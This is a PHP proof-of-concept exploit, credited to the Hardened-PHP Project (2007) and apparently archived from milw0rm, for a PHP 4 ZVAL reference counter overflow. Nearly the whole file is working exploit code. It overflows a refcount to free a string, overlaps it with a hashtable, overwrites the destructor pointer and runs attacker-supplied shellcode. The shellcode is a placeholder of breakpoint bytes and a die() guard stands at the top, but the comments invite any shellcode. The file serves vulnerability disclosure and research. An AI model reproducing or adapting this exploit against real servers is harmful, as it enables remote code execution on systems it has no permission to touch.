<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //               PHP 4 - ZVAL Reference Counter Overflow              //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");

  // You can put in any shellcode you want. Just make sure that the
  // shellcode string is long enough to not end up in PHP's internal
  // memory cache

  $shellcode = str_repeat(chr(0xcc), 500);

  // The basic idea of this exploit is:
  //  1) Create a string that has the same size as a Hashtable
  //  2) Create 65536 references to it to overflow the refcount
  //  3) Free one of these references 
  //      => Refcount drops down to 0
  //      => String gets freed
  //  4) Free some more zvals
  //  5) Create a new array with one element
  //      => Put shellcode in the key
  //      => Hashtable struct will be in the same place as the string
  //  6) Use string to directly access the content of the Hashtable
  //      => Read pointer to first bucket
  //      => Add 32 bytes, offset to array key
  //      => Write pointer to the destructor field
  //  7) Unset array => Executes code in $shellcode
  
  ////////////////////////////////////////////////////////////////////////
  // If you touch anything below this line you have to debug it yourself
  ////////////////////////////////////////////////////////////////////////

  $________________________str = str_repeat("A", 39);
  $________________________yyy = &$________________________str;
  $________________________xxx = &$________________________str;
  for ($i = 0; $i < 65534; $i++) $arr[] = &$________________________str;
  $________________________aaa = "   XXXXX   ";
  $________________________aab = " XXXx.xXXX ";
  $________________________aac = " XXXx.xXXX ";
  $________________________aad = "   XXXXX   ";
  unset($________________________xxx);
  unset($________________________aaa);
  unset($________________________aab);
  unset($________________________aac);
  unset($________________________aad);
  $arr = array($shellcode => 1);

  $addr = unpack("L", substr($________________________str, 6*4, 4));
  $addr = $addr[1] + 32;
  $addr = pack("L", $addr);

  for ($i=0; $i<strlen($addr); $i++) {
    $________________________str[8*4+$i] = $addr[$i];
    $________________________yyy[8*4+$i] = $addr[$i];
  }
  unset($arr);

?>

# milw0rm.com [2007-03-01]
